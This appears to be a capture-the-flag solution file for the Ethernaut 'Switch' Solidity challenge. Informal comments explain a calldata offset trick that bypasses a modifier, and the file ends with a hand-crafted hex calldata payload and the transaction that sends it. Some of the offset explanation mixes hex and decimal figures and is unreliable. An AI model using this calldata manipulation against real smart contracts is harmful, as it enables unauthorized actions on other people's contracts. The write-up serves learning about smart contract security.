/*
    Well, this one gonna be quite difficult to understand, But I be still trying to get us through this stuff..

    Anyways, let's begin and just nail this challenge!!
*/

// First, we need to look at the code, which you must have probably been..Our task is to turn the switch on, and it can be done by calling the "turnSwitchOn" function, 
// but wait there's a modifier which is stopping us from doing that, and what this modifier says -> you can call this function just with the help of this contract...means 'internal' spooky thing going on here

// Then, you have noticed that 'flipSwitch' function which takes a calldata and can only call some functions, but yea yea..if you look carefully and try to understand the code (if you feel difficulty in that, come on just use that damn chatGPT). After getting the code understood, you will find that flipSwitch only allows us to call the 'turnSwitchOff' function which is not really helpful for us

// Let's move forward to the solution then, I will prefer you to go through some solutions online and one of them I took the help from -> https://medium.com/coinmonks/28-gatekeeper-three-ethernaut-explained-596115f165a

// Hope you really understood it all with what that writer is trying to say, I would have told u the same, but still it's kind of lazy and a time wastage to do the things again from the scratch, but yes you might have been confused like how we get that such big calldata run this in function despite the check has been passed...

// Well, that's done with the fact that, we have changed the offset, but at offset 68, it still that 'turnSwitchOff' function signature and that's only the modifier checks about, nothing else..Thus taking the benefit of this vulnerability, we changed the offset from 20 to 60, which means run the function signature at 48 byte..and thus we got it done!!

// Now just copy the code below and paste it in the ethernaut console
const attack = '0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000'

// and now you need to just send the transaction 
await sendTransaction({from: player, to: contract.address, data: attack})

// Now check for the switch
await contract.switchOn()

// True
